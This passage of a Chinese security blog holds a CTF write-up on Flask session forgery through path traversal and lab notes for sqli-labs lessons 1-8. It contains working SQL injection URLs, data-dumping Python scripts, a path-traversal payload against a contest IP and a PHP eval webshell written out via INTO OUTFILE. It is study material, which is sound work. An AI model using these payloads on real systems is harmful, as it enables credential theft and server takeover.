session[&#39;admin&#39;]</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def login_status_check():</span><br><span class="line">    return bool(session.get(&#39;id&#39;, False))</span><br></pre></td></tr></table></figure><p>这里的逻辑就是先判断 session 中是否有 ID(是否登陆), 如果有的话就返回 session[‘admin] 的值, 那么再看一下这个session[‘admin’]是怎么来的.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@users.route(&#39;&#x2F;login&#39;, methods&#x3D;[&#39;POST&#39;, &#39;GET&#39;])</span><br><span class="line">def login():</span><br><span class="line">    Login_error &#x3D; False</span><br><span class="line">    if request.method  &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        user &#x3D; User.query.filter_by(username&#x3D;request.form.get(&#39;username&#39;)).first()</span><br><span class="line">        if not user or user.password !&#x3D; request.form.get(&#39;password&#39;):</span><br><span class="line">            Login_error &#x3D; u&#39;用户名或密码错误&#39;</span><br><span class="line">            return render_template(&quot;login.html&quot;, Login_error&#x3D;Login_error)</span><br><span class="line">        else:</span><br><span class="line">            session[&#39;id&#39;] &#x3D; user.id</span><br><span class="line">            session[&#39;username&#39;] &#x3D; user.username</span><br><span class="line">            session[&#39;admin&#39;] &#x3D; False</span><br><span class="line">            return redirect(url_for(&#39;users.user&#39;))</span><br><span class="line">    return render_template(&quot;login.html&quot;)</span><br></pre></td></tr></table></figure><p>可以看到这里只要登陆成功后便会把 <code>session[&#39;admin&#39;]</code> 设置为 <code>False</code>, 一开始在这个地方卡了好久, 不知道修改 <code>session[&#39;admin&#39;]</code>, 后来在查文章的时候发现 ph 师傅博客提到了<code>flask session</code>机制. 详情<br>博客里面提到flask中使用的session是客户端session, 通常session是储存在服务端里面的, 用户能看到的只是session的名称, 并不能看到他的值, 而flask使用的是客户端session, 是直接把值储存在用户的 cookie 中的, 所以这就导致了用户可以篡改 session. 看一下本题的 secret_key</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(&#39;.secret_key&#39;, &#39;a+b&#39;) as secret:</span><br><span class="line">    secret.seek(0)</span><br><span class="line">    key &#x3D; secret.read()</span><br><span class="line">    if not key:</span><br><span class="line">        key &#x3D; randstr(32)</span><br><span class="line">        secret.write(key)</span><br><span class="line">        secret.flush()</span><br></pre></td></tr></table></figure><p>他使用的 flask 默认的加密方法, 并且不是随机生成的 key, 而是读取外部的 key. 所以我们只要获取了 key 就可以伪造 session 了. 审了好久发现了一个目录穿越漏洞.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@users.route(&#39;&#x2F;asserts&#x2F;&lt;path:path&gt;&#39;)</span><br><span class="line">def static_handler(path):</span><br><span class="line">    filename &#x3D; os.path.join(app.root_path,&#39;asserts&#39;,path)</span><br><span class="line">    if os.path.isfile(filename):</span><br><span class="line">        return send_file(filename)</span><br><span class="line">    else:</span><br><span class="line">        abort(404)</span><br></pre></td></tr></table></figure><p>他这里没对传入的参数进行过滤, 所以导致了可以目录穿越. 直接访问<code>/assert/..%2f..%2f.secret_key</code>就可以获取到 key<br>构造<code>payload</code>下载<code>key</code>文件</p><pre><code>http://202.112.51.184:13080/asserts/..%2f..%2f.secret_key</code></pre><p>然后本地搭建环境, 把登陆部分的<code>session[&#39;admin&#39;]=False</code>改成    <code>True</code>; 然后抓登陆后的包, 把 cookie 复制过去题目就能看到 flag 了.</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这个题没做出来，对flask的理解很很差，准备写一个flask，然后把一些常见的flask漏洞做个总结。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://flag0.com/2018/08/12/xman2018%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9BWeb-MISCWriteup/#0x04-SSHOP">Misc的题目可以参考这位大佬的</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab通关笔记Less1-10</title>
      <link href="/2018/08/05/sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0Lesson1-10/"/>
      <url>/2018/08/05/sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0Lesson1-10/</url>
      
        <content type="html"><![CDATA[<p>为方便学习和理解，可以在源码中的$sql下面添加语句：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;你的 sql 语句是：&quot;.$sql.&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-1-Error-Based-String-报错注入-字符型"><a href="#Less-1-Error-Based-String-报错注入-字符型" class="headerlink" title="Less-1 Error Based- String(报错注入-字符型)"></a>Less-1 Error Based- String(报错注入-字符型)</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; and union select 1,2,3 #   正常   </span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4   报错  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>说明表有3列，下一步：union select</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1%27%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure><p>结果还是这样，不对啊：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180401/mdh5DjCLi1.png?imageslim" alt="mark"></p><p><strong>原因</strong></p><p><code>$row = mysql_fetch_array($result);</code><br>从结果集中取出一行！！<br>那么我们将前面的查询条件改变，使之查不到，就可以显示union select 后面的了。比如将id=0或者id=-1    </p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180401/JJbIBGa5BC.png?imageslim" alt="mark">    </p><p>可以利用concat和concat_ws进行但行输出多个行数据： </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union%20select%201,2,concat_ws(char(32,58,32),user(),database(),version())--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180401/eb0g95Lmei.png?imageslim" alt="mark"></p><p>这样就查出了当前用的库。   </p><p><strong>查表：</strong>   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27%20--+    </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180401/3keLk0GDA4.png?imageslim" alt="mark"> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union%20SELECT%20*%20FROM%20users%20WHERE%20id&#x3D;%270%27%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27%20LIMIT%203,1--%20%27</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180401/Kd6H07Ha9J.png?imageslim" alt="mark"></p><p>不加limit 会只查询出第一行，也就是只查出一个表。   </p><p><strong>查字段：</strong>   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_schema&#x3D;%27security%27%20and%20table_name&#x3D;%27users%27%20LIMIT%200,1--%20%27</span><br></pre></td></tr></table></figure><p>逐个改变limit x,1 查出字段<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180401/E6DkI9g3F5.png?imageslim" alt="mark"><br>查出字段值：<br>id，usename， password    </p><p><strong>查数据（随意查）：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,concat_ws(char(32,58,32),id,username,password) from  users limit 1,1 --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180401/lhBBm6dl9e.png?imageslim" alt="mark">    </p><p>附上本菜鸡的脚本，可以读出数据库所有内容：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests </span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def GetHtmlText(url):</span><br><span class="line">try:</span><br><span class="line">r &#x3D; requests.get(url, timeout&#x3D;30)</span><br><span class="line">r.raise_for_status()</span><br><span class="line">r.encoding &#x3D; r.apparent_encoding</span><br><span class="line">return r.text</span><br><span class="line">except:</span><br><span class="line">return &#39;&#39;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">url0 &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,concat_ws(char(32,124,32),id,username,password) from  users limit &quot;</span><br><span class="line">url2 &#x3D; &quot;,1 --+&quot;</span><br><span class="line">for id in range(20):</span><br><span class="line">#print(id)</span><br><span class="line">try:</span><br><span class="line">payload &#x3D; url0 + str(id) + url2</span><br><span class="line">#print(payload)</span><br><span class="line">html &#x3D; GetHtmlText(payload)</span><br><span class="line">#print(html)</span><br><span class="line">res &#x3D; re.findall(r&#39;(?&lt;&#x3D;Password:).*(?&#x3D;&lt;&#x2F;font&gt;&lt;&#x2F;font&gt;)&#39;,html)</span><br><span class="line">for i in res:</span><br><span class="line">print(res)</span><br><span class="line">except:</span><br><span class="line">continue</span><br><span class="line">print(&#39;done&#39;)</span><br><span class="line"></span><br><span class="line">main()  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180402/hLbFh8lhek.png?imageslim" alt="mark">   </p><h1 id="Less-2-Error-Based-intiger-（报错注入-整型）"><a href="#Less-2-Error-Based-intiger-（报错注入-整型）" class="headerlink" title="Less-2 Error-Based-intiger （报错注入-整型）"></a>Less-2 Error-Based-intiger （报错注入-整型）</h1><p>可以看一下源码： </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>与字符型相比，只是$id变量当做整型，而不是’$id’（字符型）,这也就导致了，我们不需要去闭合 ‘ ，其他的部分基本和字符型一致，不再赘述。   </p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180402/g3KkA8i2CA.png?imageslim" alt="mark"></p><h1 id="Less-3-Error-Based-String-with-Twist-（字符型变形）"><a href="#Less-3-Error-Based-String-with-Twist-（字符型变形）" class="headerlink" title="Less-3 Error Based- String (with Twist) （字符型变形）"></a>Less-3 Error Based- String (with Twist) （字符型变形）</h1><p>与Less1 类似，just turn  </p><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></pre><p>to</p><pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;   </code></pre><p>注意闭合即可。<br>不再赘述。<br>payload： </p><pre><code>http://localhost/sqli-labs/Less-3/?id=-1&#39;) union select 1,2,concat_ws(char(32,124,32),id,username,password) from users limit 2,1 --+</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180402/3jamd5hhGH.png?imageslim" alt="mark">   </p><h1 id="Less-4-Error-Based-DoubleQuotes-String-字符型-双引号"><a href="#Less-4-Error-Based-DoubleQuotes-String-字符型-双引号" class="headerlink" title="Less-4 Error Based- DoubleQuotes String   字符型-双引号"></a>Less-4 Error Based- DoubleQuotes String   字符型-双引号</h1><p>源码：</p><pre><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></pre><p>和Less1类似，’$id’ —&gt; (“$id”)<br>注意闭合即可，不再赘述。<br>payload：  </p><pre><code>http://localhost/sqli-labs/Less-4/?id=-1&quot;) union select 1,2,concat_ws(char(32,124,32),id,username,password) from  users limit 2,1--+</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180402/41KAGG0L2e.png?imageslim" alt="mark"></p><h1 id="Less-5-Double-Query-Single-Quotes-String-双注入查询"><a href="#Less-5-Double-Query-Single-Quotes-String-双注入查询" class="headerlink" title="Less-5 Double Query- Single Quotes- String 双注入查询"></a>Less-5 Double Query- Single Quotes- String 双注入查询</h1><p>这道题其实是在说双注入，所以脱开这题，我了解了一下双注入查询：<br><a href="https://www.2cto.com/article/201303/192718.html">https://www.2cto.com/article/201303/192718.html</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; use security</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select concat((select database()));</span><br><span class="line">+-----------------------------+</span><br><span class="line">| concat((select database())) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| security                    |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>用concat链接后面的语句，这样（(select database()））作为结果交给前面的select；   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select concat((select database()),&#39;0&#39;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| concat((select database()),&#39;0&#39;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| security0                       |</span><br><span class="line">+---------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个命令看的更清楚了，将(select database())的结果与‘0’连接。</p><p>另外：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select floor(rand()*2) from users</span><br><span class="line">    -&gt; ;</span><br><span class="line">+-----------------+</span><br><span class="line">| floor(rand()*2) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line">#返回一个行数与users表行数一样的表，但是每行都是1</span><br><span class="line">#增加临时列，每行的列值是写在select后的数</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*) from users;</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|       13 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"># 返回users表的列数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select sum(10) from users;</span><br><span class="line">+---------+</span><br><span class="line">| sum(10) |</span><br><span class="line">+---------+</span><br><span class="line">|     130 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">#计算临时列的行数乘以临时列的值（10）的结果。</span><br></pre></td></tr></table></figure><p>如果用聚合函数如count(*)，后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*),concat((select version()),&#39;|&#39;,floor(rand()*2)) as a from information_schema.tables group by a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;5.5.53|1&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure><p>可以发现版本以报错形式回显了。5.5.53  </p><p>下面爆出了库名： </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*),1,concat((select database()),&#39;|&#39;,floor(rand()*2)) as a from information_schema.tables group by a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;security|0&#39; for key &#39;group_key&#39;</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>对于没有报错回显的sql注入，双注入可以将一些信息已报错形式返回给用户。<br>这种方式有随机性。有时需要多刷新几次。</p><p>回到Less5：<br>直接注入查询表啊什么的，是没有回显的。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180403/6aibc4mb58.png?imageslim" alt="mark"><br>但是我们可以利用刚刚说的双注入，发现库名以报错形式回显！！<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180403/A316jJDh7E.png?imageslim" alt="mark"></p><p>下面就是非常好（dan）玩（teng）的手工注入过程了：<br><strong>查user</strong></p><pre><code>http://localhost/sqli-labs/Less-5/?id=1&#39; union select count(*),1, concat(&#39;|&#39;,(select user()),&#39;|&#39;, floor(rand()*2)) as a from information_schema.tables group by a --+</code></pre><p><strong>查database</strong></p><pre><code>http://localhost/sqli-labs/Less-5/?id=1&#39; union select count(*),1, concat(&#39;|&#39;,(select database()), &#39;|&#39;,floor(rand()*2)) as a from information_schema.tables group by a --+ </code></pre><p><strong>查table（改变limit后面的值来查看多个表）</strong></p><pre><code>http://localhost/sqli-labs/Less-5/?id=1&#39; union select count(*),1, concat(&#39;|&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;|&#39;, floor(rand()*2)) as a from information_schema.tables group by a --+</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180403/9cag04b105.png?imageslim" alt="mark"><br><strong>查column（改limit x,1）</strong></p><pre><code>http://localhost/sqli-labs/Less-5/?id=1&#39; union select count(*),1, concat(&#39;|&#39;,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),&#39;|&#39;, floor(rand()*2)) as a from information_schema.tables group by a--+ </code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180403/KEi4Ajed7E.png?imageslim" alt="mark"></p><p><strong>查数据</strong></p><pre><code>http://localhost/sqli-labs/Less-5/?id=1&#39; union select count(*),1, concat(&#39;|&#39;,(select concat_ws(&#39;:&#39;,id,username,password) from users limit 2,1),&#39;|&#39;, floor(rand()*2)) as a from information_schema.tables group by a--+  </code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180403/D3CHiG0hbI.png?imageslim" alt="mark"></p><p>以上由于使用的是随机数，可能出现正确结果而不报错，这种情况下，多刷新几次即可。</p><h1 id="Less-6-Double-Query-Double-Quotes-String-双注入-双引号"><a href="#Less-6-Double-Query-Double-Quotes-String-双注入-双引号" class="headerlink" title="Less-6 Double Query- Double Quotes- String(双注入-双引号)"></a>Less-6 Double Query- Double Quotes- String(双注入-双引号)</h1><p>与Less-5其实一样。</p><pre><code>#Less5$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;#Less-6$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></pre><p>只是闭合方式不同，不再赘述。   </p><h1 id="less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="less-7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</h1><p>导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中。</p><p>常用的语句是：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;&quot; into outfile &quot;XXX\test.php&quot; ，</span><br></pre></td></tr></table></figure><p>当这里要获取到网站的在系统中的具体路径（绝对路径）<br>这个要怎么获取呢，根据系统和数据库猜测，如winserver的iis默认路径是c:/inetpub/wwwroot/，这好像说偏了，这是asp的，但知道也好</p><p>linux的nginx一般是<code>/usr/local/nginx/html</code>，<code>/home/wwwroot/default</code>，<code>/usr/share/nginx</code>，<code>/var/www/htm</code>等<br>apache 就<code>/var/www/htm</code>，<code>/var/www/html/htdocs</code></p><p>另外，还有读取数据库路径的方法: 利用两个变量<br>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180804/eGk6hG97KE.png?imageslim" alt="mark"></p><p>虽然报错，但是语句执行了。注意路径需要转义，否则报错且无法执行。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180804/eDmlcDim0I.png?imageslim" alt="mark"></p><p>发现文件已经写到目录下了。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180804/a637cB84GI.png?imageslim" alt="mark"></p><p>可以执行命令了。也可以菜刀连。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180804/634720FJma.png?imageslim" alt="mark"></p><h1 id="Less-8-Blind-Boolian-Single-Quotes-String-单引号-布尔盲注"><a href="#Less-8-Blind-Boolian-Single-Quotes-String-单引号-布尔盲注" class="headerlink" title="Less-8 Blind- Boolian- Single Quotes- String(单引号-布尔盲注)"></a>Less-8 Blind- Boolian- Single Quotes- String(单引号-布尔盲注)</h1><blockquote><p>盲注需要掌握一些MySQL的相关函数：</p><p>length(str)：<br>返回str字符串的长度。</p><p>substr(str, pos, len)：<br>将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p>mid(str,pos,len):跟上面的一样，截取字符串</p><p> ascii(str)：返回字符串str的最左面字符的ASCII代码值。</p><p>ord(str):同上，返回ascii码</p><p>if(a,b,c) :<br>a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p><p>首先要记得常见的ASCII，A:65,Z:90 a:97,z:122,  0:48, 9:57</p></blockquote><p>发现加个单引号跟没加显示不一样，<br>加了单引号连<code>you are in</code>都不显示了，没有报错，所以只能用盲注判断了</p><p><strong>查询数据库</strong></p><pre><code>select database()ascii(substr((select database()),1,1))   # 返回数据库名称的第一个字母，转化为ascii码的值ascii(substr((select database()),1,1))&gt;64   # ascii大于64就返回true，if就返回1，否则返回0</code></pre><p>于是payload:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and if(ascii(substr((select database()),1,1))&gt;64, 1, 0) %23</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1))&gt;64 %23</span><br></pre></td></tr></table></figure><p>猜数据库名第一个字母具体过程，使用二分法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1)&gt;64 %23 返回正确，大于64</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1))&gt;96 %23 返回正确，大于96</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1))&lt;123 %23 返回正确，小于123 ，区间在97-122</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1))&gt;109 %23 返回正确，大于109，区间在110-122</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1))&gt;116 %23 返回错误，所以在110-116之间</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1))&gt;112 %23 返回正确，大于112，区间在113-116之间</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1))&gt;114 %23 返回正确，大于114，间在115-116之间</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1))&gt;115 %23 返回错误，不大于115，即第一个字母的ascii为115，即字母s</span><br></pre></td></tr></table></figure><p>师傅的脚本（一比，我的简直太垃圾了）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line"> </span><br><span class="line">&quot;&quot;&quot; </span><br><span class="line">@version:  </span><br><span class="line">@author: giantbranch </span><br><span class="line">@file: blindsqlinjection.py </span><br><span class="line">@time: 2016&#x2F;5&#x2F;1  </span><br><span class="line">&quot;&quot;&quot; </span><br><span class="line"> </span><br><span class="line">import urllib2</span><br><span class="line">import urllib</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">success_str &#x3D; &quot;You are in&quot;</span><br><span class="line">getTable &#x3D; &quot;users&quot;</span><br><span class="line"> </span><br><span class="line">index &#x3D; &quot;0&quot;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&quot;</span><br><span class="line">database &#x3D; &quot;database()&quot;</span><br><span class="line">selectDB &#x3D; &quot;select database()&quot; </span><br><span class="line">selectTable &#x3D; &quot;select table_name from information_schema.tables where table_schema&#x3D;&#39;%s&#39; limit %d,1&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">asciiPayload &#x3D; &quot;&#39; and ascii(substr((%s),%d,1))&gt;&#x3D;%d #&quot;</span><br><span class="line">lengthPayload &#x3D; &quot;&#39; and length(%s)&gt;&#x3D;%d #&quot;</span><br><span class="line">selectTableCountPayload &#x3D; &quot;&#39;and (select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;%s&#39;)&gt;&#x3D;%d #&quot;</span><br><span class="line"> </span><br><span class="line">selectTableNameLengthPayloadfront &#x3D; &quot;&#39;and (select length(table_name) from information_schema.tables where table_schema&#x3D;&#39;%s&#39; limit &quot; </span><br><span class="line">selectTableNameLengthPayloadbehind &#x3D; &quot;,1)&gt;&#x3D;%d #&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># 发送请求，根据页面的返回的判断长度的猜测结果</span><br><span class="line"># string:猜测的字符串payload:使用的payloadlength：猜测的长度</span><br><span class="line">def getLengthResult(payload, string, length):</span><br><span class="line">finalUrl &#x3D; url + urllib.quote(payload % (string, length))</span><br><span class="line">res &#x3D; urllib2.urlopen(finalUrl)</span><br><span class="line">if success_str in res.read():</span><br><span class="line">return True</span><br><span class="line">else:</span><br><span class="line">return False</span><br><span class="line"> </span><br><span class="line"># 发送请求，根据页面的返回的判断猜测的字符是否正确</span><br><span class="line"># payload:使用的payloadstring:猜测的字符串pos：猜测字符串的位置ascii：猜测的ascii</span><br><span class="line">def getResult(payload, string, pos, ascii):</span><br><span class="line">finalUrl &#x3D; url + urllib.quote(payload % (string, pos, ascii))</span><br><span class="line">res &#x3D; urllib2.urlopen(finalUrl)</span><br><span class="line">if success_str in res.read():</span><br><span class="line">return True</span><br><span class="line">else:</span><br><span class="line">return False</span><br><span class="line"> </span><br><span class="line"># 注入</span><br><span class="line">def inject():</span><br><span class="line"># 猜数据库长度</span><br><span class="line">lengthOfDBName &#x3D; getLengthOfString(lengthPayload, database)</span><br><span class="line">print &quot;length of DBname: &quot; + str(lengthOfDBName)</span><br><span class="line"># 获取数据库名称</span><br><span class="line">DBname &#x3D; getName(asciiPayload, selectDB, lengthOfDBName)</span><br><span class="line"></span><br><span class="line">print &quot;current database:&quot; + DBname</span><br><span class="line"> </span><br><span class="line"># 获取数据库中的表的个数</span><br><span class="line"># print selectTableCountPayload</span><br><span class="line">tableCount &#x3D; getLengthOfString(selectTableCountPayload, DBname)</span><br><span class="line">print &quot;count of talbe:&quot; + str(tableCount)</span><br><span class="line"> </span><br><span class="line"># 获取数据库中的表</span><br><span class="line">for i in xrange(0,tableCount):</span><br><span class="line"># 第几个表</span><br><span class="line">num &#x3D; str(i)</span><br><span class="line"># 获取当前这个表的长度</span><br><span class="line">selectTableNameLengthPayload &#x3D; selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind</span><br><span class="line">tableNameLength &#x3D; getLengthOfString(selectTableNameLengthPayload, DBname)</span><br><span class="line">print &quot;current table length:&quot; + str(tableNameLength)</span><br><span class="line"># 获取当前这个表的名字</span><br><span class="line">selectTableName &#x3D; selectTable%(DBname, i)</span><br><span class="line">tableName &#x3D; getName(asciiPayload, selectTableName ,tableNameLength)</span><br><span class="line">print tableName</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">selectColumnCountPayload &#x3D; &quot;&#39;and (select count(column_name) from information_schema.columns where table_schema&#x3D;&#39;&quot;+ DBname +&quot;&#39; and table_name&#x3D;&#39;%s&#39;)&gt;&#x3D;%d #&quot;</span><br><span class="line"># print 